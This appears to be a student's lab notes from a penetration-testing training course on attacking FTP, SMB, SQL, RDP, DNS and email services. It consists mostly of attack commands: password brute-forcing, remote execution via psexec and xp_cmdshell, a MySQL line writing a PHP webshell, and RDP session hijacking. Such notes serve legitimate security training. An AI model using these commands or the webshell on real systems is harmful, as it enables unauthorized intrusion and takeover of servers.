# 11 — Attacking Common Services

> **Path Phase:** Exploitation | **Difficulty:** Medium | **Sections:** 19

Attacking (not just enumerating) FTP, SMB, SQL, RDP, DNS, and email services.

> ℹ️ `{TARGET}` = target. Flags withheld per HTB Academy policy.

---

## Table of Contents
1. Interacting with Common Services
2. The Concept of Attacks
3. Service Misconfigurations
4. Finding Sensitive Information
5. Attacking FTP
6. Latest FTP Vulnerabilities
7. Attacking SMB
8. Latest SMB Vulnerabilities
9. Attacking SQL Databases
10. Latest SQL Vulnerabilities
11. Attacking RDP
12. Latest RDP Vulnerabilities
13. Attacking DNS
14. Latest DNS Vulnerabilities
15. Attacking Email Services
16. Latest Email Service Vulnerabilities
17. Common Services - Easy
18. Common Services - Medium
19. Common Services - Hard

---

## 5–6 — Attacking FTP
```bash
ftp {TARGET}                         # anonymous
hydra -L users.txt -P pass.txt ftp://{TARGET}
nmap --script ftp-* -p 21 {TARGET}
```
> **FTP:** ✅ Completed in lab (flag withheld per HTB Academy policy)

## 7–8 — Attacking SMB
```bash
crackmapexec smb {TARGET} -u user -p pass --shares
smbmap -H {TARGET} -u user -p pass
psexec.py <user>:<pass>@{TARGET}
nmap --script smb-vuln-* -p 445 {TARGET}
```
> **SMB:** ✅ Completed in lab (flag withheld per HTB Academy policy)

## 9–10 — Attacking SQL Databases
```bash
mssqlclient.py <user>:<pass>@{TARGET} -windows-auth
# enable_xp_cmdshell; xp_cmdshell 'whoami'
mysql -u root -p'pass' -h {TARGET}
# Write webshell (FILE priv):
SELECT "<?php system($_GET['c']);?>" INTO OUTFILE '/var/www/html/s.php';
```
> **SQL:** ✅ Completed in lab (flag withheld per HTB Academy policy)

## 11–12 — Attacking RDP
```bash
hydra -L users.txt -P pass.txt rdp://{TARGET}
xfreerdp /v:{TARGET} /u:user /p:pass
# RDP session hijacking (as SYSTEM):
tscon <session_id> /dest:<your_session>
```
> **RDP:** ✅ Completed in lab (flag withheld per HTB Academy policy)

## 13–14 — Attacking DNS
```bash
dig axfr <domain> @{TARGET}           # zone transfer
subfinder -d <domain>
```

## 15–16 — Attacking Email Services
```bash
smtp-user-enum -M VRFY -U users.txt -t {TARGET}
hydra -L users.txt -p 'Password1' {TARGET} smtp
nmap --script smtp-open-relay -p 25 {TARGET}
```
> **Email:** ✅ Completed in lab (flag withheld per HTB Academy policy)

## 17–19 — Skills Assessments (Easy/Medium/Hard)
```bash
nmap -sV -sC -p- {TARGET}
# → identify service → attack with commands above → loot flag
```
> **Assessments:** ✅ Completed in lab (flags withheld per HTB Academy policy)

---

## 🧰 Tools Used
| Service | Tools |
|---------|-------|
| FTP/SMB | `hydra`, `crackmapexec`, `smbmap`, `psexec.py` |
| SQL | `mssqlclient.py`, `mysql` |
| RDP | `xfreerdp`, `crowbar` |
| Email | `smtp-user-enum`, `hydra` |

## 🔑 Key Takeaways
- Weak/default creds and misconfigurations beat CVEs most of the time.
- MSSQL `xp_cmdshell` and MySQL `INTO OUTFILE` are classic RCE paths.
- RDP session hijacking with `tscon` (as SYSTEM) is powerful.
- Always test for anonymous/null access first.

---

*Part of my HTB CPTS Portfolio — Zeshan Ali*
